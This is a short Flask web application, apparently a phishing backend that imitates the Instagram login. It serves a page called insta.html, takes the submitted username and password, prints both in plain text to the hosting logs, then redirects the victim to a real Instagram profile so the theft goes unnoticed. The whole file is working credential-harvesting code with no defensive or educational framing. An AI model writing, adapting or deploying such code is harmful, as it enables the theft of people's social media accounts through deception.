from flask import Flask, request, redirect, send_from_directory
import os

app = Flask(__name__)

# Instagram profile to redirect to after login
MY_INSTAGRAM_URL = "https://www.instagram.com/ex.clothi/"

# Homepage -> redirect to the login page (no 404)
@app.route("/")
def home():
    return redirect("/login")

# Login route: GET -> serve insta.html, POST -> log and redirect to Instagram
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        # These prints appear in Render Logs
        print(f"Received login - Username: {username}, Password: {password}")
        return redirect(MY_INSTAGRAM_URL)
    # serve the insta.html file from the repo folder
    base_dir = os.path.dirname(__file__)
    return send_from_directory(base_dir, "insta.html")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
